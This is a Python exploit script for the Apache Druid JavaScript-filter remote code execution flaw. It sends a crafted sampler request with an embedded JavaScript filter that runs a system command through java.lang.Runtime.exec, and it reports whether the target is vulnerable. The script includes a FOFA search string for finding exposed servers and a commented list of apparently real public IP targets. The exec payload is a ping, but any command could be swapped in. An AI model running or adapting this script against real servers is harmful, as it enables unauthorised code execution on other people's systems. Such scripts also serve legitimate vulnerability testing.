#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re
import json

def title():
    print('+          FOFA: "Apache-Druid"')

def run_proto(url):
    check_url = url + "/druid/indexer/v1/sampler"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Content-Type": "application/json"
    }
    data = {
        "type": "index",
        "spec": {
            "ioConfig": {
                "type": "index",
                "inputSource": {
                    "type": "inline",
                    "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"
                },
                "inputFormat": {
                    "type": "json",
                    "keepNullColumns": True
                }
            },
            "dataSchema": {
                "dataSource": "sample",
                "timestampSpec": {
                    "column": "timestamp",
                    "format": "iso"
                },
                "dimensionsSpec": {

                },
                "transformSpec": {
                    "transforms": [],
                    "filter": {
                        "type": "javascript",
                        "dimension": "added",
                        "function": "function(value) {java.lang.Runtime.getRuntime().exec('ping 127.0.0.1')}",
                        "": {
                            "enabled": True
                        }
                    }
                }
            },
            "type": "index",
            "tuningConfig": {
                "type": "index"
            }
        },
        "samplerConfig": {
            "numRows": 500,
            "timeoutMs": 15000
        }
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        resp = requests.post(url=check_url, data=json.dumps(data), headers=headers,  verify=False, timeout=6)
        reContent = re.search('numRowsRead.*?:.*?numRowsIndexed.*?data', resp.text, re.I).group()
        if reContent and resp.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        return False

def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1

if __name__ == '__main__':
    title()
    #target = '3.142.21.187:8888;94.23.205.177:8081;13.127.86.146:8888'
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')

